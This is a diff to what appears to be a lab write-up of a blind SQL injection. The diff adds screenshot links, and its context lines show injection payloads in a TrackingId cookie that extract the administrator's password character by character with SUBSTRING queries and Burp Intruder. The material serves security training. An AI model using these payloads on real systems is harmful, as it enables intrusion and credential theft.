@@ -42,6 +42,8 @@ TrackingId=fTQ0mZhvU861D4EK' AND '1'='2
 
 This confirms the blind SQL injection vulnerability - we can infer query results from the presence/absence of the welcome message.
 
+![Blind SQL Injection Verification](img/result.jpg)
+
 ### Step 2: Confirm Database Structure
 
 Verifying the existence of the `users` table and `administrator` user.
@@ -115,10 +117,14 @@ TrackingId=fTQ0mZhvU861D4EK' AND (SELECT SUBSTRING(password,1,1) FROM users WHER
 Cookie: TrackingId=fTQ0mZhvU861D4EK' AND (SELECT SUBSTRING(password,$1$,1) FROM users WHERE username='administrator')='$a$'--;
 ```
 
+![Burp Intruder Setup](img/burp-intruder-cluster-bomb result.jpg)
+
 **Attack Process:**
 1. Position 1: Test all characters (a-z, 0-9)
 2. Find character that returns "Welcome back" message
 3. Repeat for positions 2-20
+
+![Character-by-Character Extraction](img/query-retreiving-char-by-char.jpg)
 
 **Extracted Password:** [REDACTED FOR SECURITY]
 
